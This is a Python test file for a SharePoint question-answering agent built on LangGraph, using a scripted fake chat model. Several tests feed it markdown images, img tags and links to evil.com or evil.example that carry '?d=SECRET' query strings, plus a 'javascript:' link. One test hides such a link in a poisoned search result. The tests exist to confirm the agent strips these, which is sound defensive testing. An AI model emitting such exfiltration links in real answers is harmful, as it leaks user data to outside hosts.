"""sharepoint_ask's LangGraph loop with a scripted fake chat model (no API calls)."""
import asyncio
import time

from langchain_core.messages import AIMessage, HumanMessage, ToolMessage
from sharepoint_rag.search import Hit

from mcp_server import agent


def call(name, args, id="t1"):
    return {"name": name, "args": args, "id": id, "type": "tool_call"}


def reply(*calls, stop="tool_use", text=""):
    return AIMessage(
        content=text, tool_calls=list(calls), response_metadata={"stop_reason": stop},
        usage_metadata={"input_tokens": 100, "output_tokens": 50, "total_tokens": 150},
    )


class FakeModel:
    """Stands in for any LangChain chat model: bind_tools + ainvoke."""

    def __init__(self, replies):
        self.replies = list(replies)
        self.requests: list[list] = []
        self.bound_tools = None

    def bind_tools(self, tools):
        self.bound_tools = tools
        return self

    async def ainvoke(self, messages):
        self.requests.append(list(messages))
        reply = self.replies.pop(0)
        if isinstance(reply, Exception):
            raise reply
        return reply


HIT = Hit(chunk_id=1, source_id=7, name="leave-policy.md", web_url="https://sp/leave", heading_path="Leave",
          text="Employees get 22 working days of annual leave.", drive_id="d", item_id="i", score=1.0)


def tools():
    async def search(q, k):
        return [HIT]

    async def read_file(d, i):
        return {"name": "leave-policy.md", "text": "Full text: 22 working days. Carry over 5.", "webUrl": "https://sp/leave", "parentId": "folder1"}

    async def list_items(d, i):
        return [{"id": "x", "name": "other.md", "webUrl": "https://sp/other", "file": {}}]

    return agent.AskTools(search=search, read_file=read_file, list_items=list_items)


async def run(model, ask_tools=None, **kw):
    args = dict(max_steps=6, max_tokens=100_000, timeout_seconds=30)
    return await agent.ask(model, "How many leave days?", ask_tools or tools(), **{**args, **kw})


async def test_answer_with_validated_sources():
    model = FakeModel([
        reply(call("search", {"query": "annual leave days", "limit": 5})),
        reply(call("final_answer", {"found": True, "answer": "22 days. See https://sp/leave or https://evil.example/x", "citations": [
            {"source_id": "S1", "quote": "22 working days of annual leave"},
            {"source_id": "S1", "quote": "a quote that is not in the document"},
            {"source_id": "S99", "quote": "never retrieved"},
        ]})),
    ])
    result = await run(model)
    assert result.status == "answered" and result.steps == 2 and result.tokens == 300
    assert result.sources == [{"title": "leave-policy.md", "link": "https://sp/leave", "quote": "22 working days of annual leave"}]
    assert "https://sp/leave" in result.answer and "evil.example" not in result.answer
    assert [t["name"] for t in model.bound_tools] == ["search", "read_file", "list_items", "final_answer"]
    last = model.requests[1][-1]
    assert isinstance(last, ToolMessage) and last.tool_call_id == "t1"


async def test_read_and_list_use_registered_sources_only():
    model = FakeModel([
        reply(call("search", {"query": "leave", "limit": 3})),
        reply(call("read_file", {"source_id": "S1"}, "a"), call("read_file", {"source_id": "S5"}, "b")),
        reply(call("list_items", {"source_id": "S1"})),
        reply(call("final_answer", {"found": True, "answer": "Carry over 5.", "citations": [{"source_id": "S1", "quote": "Carry over 5."}]})),
    ])
    result = await run(model)
    good, bad = model.requests[2][-2:]
    assert good.status == "success" and bad.status == "error" and "Unknown source_id" in bad.content
    assert "S2" in model.requests[3][-1].content  # the listed sibling got an id
    assert result.sources[0]["quote"] == "Carry over 5."


async def test_answer_links_are_neutralised_and_unverified_citations_dropped():
    model = FakeModel([
        reply(call("search", {"query": "leave", "limit": 5})),
        reply(call("list_items", {"source_id": "S1"})),  # registers S2 without reading it
        reply(call("final_answer", {"found": True, "citations": [
            {"source_id": "S1", "quote": "22 working days"},
            {"source_id": "S2", "quote": ""},  # never read: can't be cited
        ], "answer": "22 days ![x](//evil.com/a.png?d=SECRET) <img src=//evil.com/b> evil.com/c?d=1 [y](javascript:alert(1))"})),
    ])
    result = await run(model)
    assert [s["title"] for s in result.sources] == ["leave-policy.md"]
    assert "evil.com" not in result.answer and "javascript" not in result.answer and "<img" not in result.answer


async def test_not_found_is_a_valid_answer():
    model = FakeModel([reply(call("final_answer", {"found": False, "answer": "Nothing about that.", "citations": []}))])
    result = await run(model)
    assert result.status == "not_found" and result.sources == []


async def test_runs_out_of_steps_and_returns_what_it_found():
    model = FakeModel([reply(call("search", {"query": f"q{i}", "limit": 5})) for i in range(3)])
    result = await run(model, max_steps=3)
    assert result.status == "budget_exhausted" and result.steps == 3
    assert result.sources and result.sources[0]["link"] == "https://sp/leave"
    nudge = model.requests[2][-1]
    assert isinstance(nudge, HumanMessage) and "final_answer" in nudge.content


async def test_partial_sources_are_neutralised_too():
    planted = Hit(chunk_id=2, source_id=8, name="notes.md", web_url="https://sp/notes", heading_path=None,
                  text='Leave is 22 days. ![x](https://evil.example/?d=secret) <a href="//evil.example/y">more</a> https://sp/notes',
                  drive_id="d", item_id="j", score=1.0)

    async def search(q, k):
        return [planted]

    ask_tools = agent.AskTools(search=search, read_file=tools().read_file, list_items=tools().list_items)
    model = FakeModel([reply(call("search", {"query": f"q{i}", "limit": 5})) for i in range(2)])
    result = await run(model, ask_tools, max_steps=2)
    assert result.status == "budget_exhausted"
    quote = result.sources[0]["quote"]
    assert "evil.example" not in quote and "<a" not in quote
    assert "Leave is 22 days." in quote and "https://sp/notes" in quote  # the source's own link survives


async def test_token_budget_stops_the_loop():
    model = FakeModel([reply(call("search", {"query": "q", "limit": 5})) for _ in range(5)])
    result = await run(model, max_tokens=300)
    assert result.status == "budget_exhausted" and len(model.requests) == 2


async def test_refusal_is_reported():
    assert (await run(FakeModel([reply(stop="refusal")]))).status == "refused"
    assert (await run(FakeModel([reply(stop="content_filter")]))).status == "refused"  # OpenAI's name for it


async def test_model_errors_are_returned_with_tokens_counted():
    model = FakeModel([reply(call("search", {"query": "q", "limit": 5})), RuntimeError("provider is down")])
    result = await run(model)
    assert result.status == "error" and result.tokens == 150


async def test_revoked_sign_in_stops_the_run_and_cancels_parallel_calls():
    cancelled = []

    async def search(q, k):
        if q == "slow":
            try:
                await asyncio.sleep(10)
            except asyncio.CancelledError:
                cancelled.append(q)
                raise
        raise PermissionError("token revoked")

    t = tools()
    t.search = search
    model = FakeModel([reply(call("search", {"query": "slow", "limit": 1}, "a"), call("search", {"query": "fast", "limit": 1}, "b"))])
    result = await run(model, t)
    assert result.status == "error" and "sign in again" in result.answer
    assert cancelled == ["slow"]


def test_link_stripping_stays_fast_on_adversarial_answers():
    # One run of non-space text used to cost quadratic time on the event loop (seconds for ~30k characters).
    for unit in ("ab.", "a:", "a:a/", "<a"):
        start = time.perf_counter()
        out = agent._plain(unit * 10_000, set())
        assert time.perf_counter() - start < 0.5
        assert "a:" not in out and "ab.ab" not in out or unit == "<a"
    long_link = "https://evil.example/" + "x" * 1000
    assert agent._plain(f"see {long_link} and https://sp/a.", {"https://sp/a"}) == "see [link removed] and https://sp/a."
    assert agent._plain("文" * 600, set()) == "文" * 600  # long text without spaces or link characters is kept


def test_tools_convert_for_real_providers():
    """The neutral tool schemas bind to a real LangChain provider (offline: no request is sent)."""
    # The converter ChatGoogleGenerativeAI applies to bound tools when it builds a request.
    from langchain_google_genai._function_utils import convert_to_genai_function_declarations

    declarations = convert_to_genai_function_declarations(agent.TOOLS)[0].function_declarations
    assert [d.name for d in declarations] == ["search", "read_file", "list_items", "final_answer"]
    assert declarations[0].parameters.required == ["query", "limit"]
    assert declarations[3].parameters.properties["citations"].items.required == ["source_id", "quote"]
